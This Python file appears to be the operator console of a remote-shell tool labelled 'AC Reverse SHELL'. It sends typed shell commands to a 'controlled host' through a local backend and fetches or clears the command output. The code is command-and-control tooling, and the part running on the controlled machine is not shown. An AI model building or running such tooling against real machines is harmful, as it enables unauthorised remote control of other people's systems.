import os
import requests
from enum import StrEnum

class Messages:
    hello = """
--------- AC Reverse SHELL ---------
Do not use this for illegal purposes!
"""
    commands_list = """
Type only number from the list:
 
1) Send command to controlled host
2) Get the last shell output
3) Clear the last shell output
4) Help (get commands list)
0) Exit
"""
    unrecognised_cmd = "Unrecognised number!"


class API(StrEnum):
    BASE_BACKEND_URL = "http://127.0.0.1:8000"

    cmd = f"{BASE_BACKEND_URL}/shell/cmd"
    output = f"{BASE_BACKEND_URL}/shell/output"


def clear_screen():
    if os.name == "nt":
        os.system("cls")
    elif os.name == "posix":
        os.system("clear")


def main():
    clear_screen()
    print(Messages.hello)
    print(Messages.commands_list)
    while True:
        choice = input("Your choice >> ")

        try:
            if choice == "1":
                input_cmd = input("Enter shell command >> ")
                requests.post(API.cmd, json=input_cmd)
                print("Sent!")
            elif choice == "2":
                last_output = requests.get(API.output).json()["output"]
                print(last_output)
            elif choice == "3":
                requests.delete(API.output)
                print("Cleared!")
            elif choice == "4":
                print(Messages.commands_list)
            elif choice == "0":
                print("Exiting...")
                exit(0)
            else:
                print(Messages.unrecognised_cmd)
        except Exception as e:
            print("Server error!")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Exiting...")
